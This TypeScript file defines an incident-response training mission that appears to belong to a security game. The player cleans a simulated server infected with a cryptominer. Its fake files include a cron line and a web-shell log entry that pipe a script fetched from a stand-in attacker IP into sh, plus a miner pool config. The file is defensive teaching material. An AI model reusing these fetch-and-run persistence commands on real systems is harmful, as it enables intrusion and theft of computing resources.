import type { MissionDef } from '../../types';
import { terminalMission } from '../../helpers';

export const C2_IP = '198.51.100.77';
const BIN = '/tmp/.x/kworkerd';
const CRON = `*/5 * * * * curl -s http://${C2_IP}/x.sh | sh >/dev/null 2>&1\n`;

export const missionK2: MissionDef = {
  id: 'k2', lab: 'cloud', order: 2, baseXp: 350, hintCount: 3, parTime: 360,
  createSession() {
    const st = { pid: 31337 as number | null, cron: true, bin: true, sinceKill: 0 };
    const s = terminalMission({
      files: {
        [BIN]: { content: '\x7fELF [binary: xmrig 6.21 build, stripped]', owner: 'www-data', perms: '-rwxr-xr-x', mtime: 'Nov  6 02:41' },
        '/tmp/.x/config.json': { content: `{ "pools": [{ "url": "pool.coin-mine.example:4444", "user": "4Ax9...", "pass": "web01" }], "cpu": { "max-threads-hint": 95 } }\n`, owner: 'www-data', mtime: 'Nov  6 02:41' },
        '/var/log/nginx/access.log': `203.0.113.61 - - [06/Nov/2026:02:40:58 +0000] "POST /upload.php HTTP/1.1" 200 54 "-" "python-requests/2.31"\n203.0.113.61 - - [06/Nov/2026:02:41:03 +0000] "GET /uploads/shell.php?c=curl+-s+http://${C2_IP}/x.sh|sh HTTP/1.1" 200 12 "-" "python-requests/2.31"\n10.0.1.21 - - [06/Nov/2026:08:01:10 +0000] "GET /health HTTP/1.1" 200 2 "-" "curl/8.5.0"\n`,
        '/home/ops/ticket.txt': `ALERT web-01: CPU at 98% for 6 hours (normal: 7%)
Billing alarm: instance cost +340% today.

1. Stop whatever is eating the CPU.
2. Make sure it can't come back by itself.
3. Delete the malware from disk.
4. Find the server it downloads from:  submit ip <address>
`,
      },
      dirs: ['/tmp', '/var/www/html/uploads'],
      user: 'ops', host: 'web-01', cwd: '/home/ops', ticket: 'INC-4519',
      helpExtra: '  ps aux, top, kill <pid>, crontab [-u user] -l|-r, rm [-r] <path>\n',
      answers: { ip: (v) => v === C2_IP ? { ok: true, key: 'fb.k2.ipOk' } : { ok: false, key: v === '203.0.113.61' ? 'fb.k2.uploader' : 'fb.k2.ipWrong' } },
      extra: ({ setFeedback }) => {
        const respawnCheck = () => {
          if (st.pid === null && st.cron && st.bin) {
            st.sinceKill++;
            if (st.sinceKill >= 2) { st.pid = 31337 + 100 + Math.floor(st.sinceKill * 7); st.sinceKill = 0; setFeedback({ ok: false, key: 'fb.k2.respawn' }); }
          }
        };
        const psOut = () => `USER         PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
root           1  0.0  0.1 167404 11880 ?        Ss   Oct30   0:12 /sbin/init
root         611  0.0  0.1  15432  6020 ?        Ss   Oct30   0:00 sshd: /usr/sbin/sshd -D
root         911  0.0  0.0  55220  1544 ?        Ss   Oct30   0:00 nginx: master process
www-data     912  0.1  0.2  55880  5400 ?        S    Oct30   1:02 nginx: worker process
www-data    1022  0.2  1.1 212340 44120 ?        S    Oct30   3:41 php-fpm: pool www
` + (st.pid ? `www-data   ${st.pid} 98.7  4.2 902114 171220 ?       Sl   02:41 354:12 ${BIN} -c /tmp/.x/config.json\n` : '') +
          `ops         4410  0.0  0.1  10072  4100 pts/0    R+   08:42   0:00 ps aux\n`;
        return {
          ps: () => { respawnCheck(); return { out: psOut(), code: 0 }; },
          top: () => { respawnCheck(); return { out: `top - 08:42:11 up 7 days, load average: ${st.pid ? '3.98, 3.97, 3.95' : '0.08, 0.31, 1.02'}\n` + psOut().split('\n').filter((l) => /kworkerd|PID/.test(l)).join('\n') + '\n', code: 0 }; },
          kill: (args, _s, ctx) => {
            const pid = Number(args.filter((a) => !a.startsWith('-'))[0]);
            if (!pid) return { out: 'kill: usage: kill [-9] pid\n', code: 2 };
            if (pid !== st.pid) return { out: pid === 1 || pid === 611 || pid === 911 ? `bash: kill: (${pid}) - Operation not permitted\n` : `bash: kill: (${pid}) - No such process\n`, code: 1 };
            if (!ctx.sudo) return { out: `bash: kill: (${pid}) - Operation not permitted\n`, code: 1 };
            st.pid = null; st.sinceKill = 0;
            setFeedback(st.cron ? { ok: true, key: 'fb.k2.killedCronLeft' } : { ok: true, key: 'fb.k2.killed' });
            return { out: '', code: 0 };
          },
          crontab: (args, _s, ctx) => {
            const ui = args.indexOf('-u'); const user = ui >= 0 ? args[ui + 1] : ctx.user;
            if (user !== ctx.user && !ctx.sudo) return { out: 'crontab: must be privileged to use -u\n', code: 1 };
            if (args.includes('-l')) return user === 'www-data' && st.cron ? { out: CRON, code: 0 } : { out: `no crontab for ${user}\n`, code: 1 };
            if (args.includes('-r')) { if (user === 'www-data' && st.cron) { st.cron = false; setFeedback({ ok: true, key: 'fb.k2.cron' }); return { out: '', code: 0 }; } return { out: `no crontab for ${user}\n`, code: 1 }; }
            return { out: 'usage: crontab [-u user] -l | -r\n', code: 2 };
          },
          rm: (args, _s, ctx) => {
            const paths = args.filter((a) => !a.startsWith('-'));
            if (!paths.length) return { out: 'rm: missing operand\n', code: 1 };
            let out = '';
            for (const p of paths) {
              const full = p.startsWith('/') ? p : ctx.cwd + '/' + p;
              const norm = full.replace(/\/+$/, '');
              if (norm === BIN || (norm === '/tmp/.x' && args.some((a) => /r/.test(a) && a.startsWith('-')))) {
                if (!ctx.sudo) { out += `rm: cannot remove '${p}': Permission denied\n`; continue; }
                st.bin = false; ctx.fs.remove(BIN); if (norm === '/tmp/.x') ctx.fs.remove('/tmp/.x/config.json');
                setFeedback({ ok: true, key: st.pid ? 'fb.k2.rmRunning' : 'fb.k2.rm' });
              } else if (norm === '/tmp/.x') out += `rm: cannot remove '${p}': Is a directory\n`;
              else if (ctx.fs.isFile(norm)) out += `rm: cannot remove '${p}': Permission denied\n`;
              else out += `rm: cannot remove '${p}': No such file or directory\n`;
            }
            return { out, code: out ? 1 : 0 };
          },
        };
      },
      objectives: ['process', 'cron', 'binary', 'ip'],
      status: (d) => ({ process: st.pid === null, cron: !st.cron, binary: !st.bin, ip: !!d.ip }),
      motd: 'web-01 (Ubuntu 24.04) — production web server\nStart with: cat ticket.txt\n',
    });
    return s;
  },
};
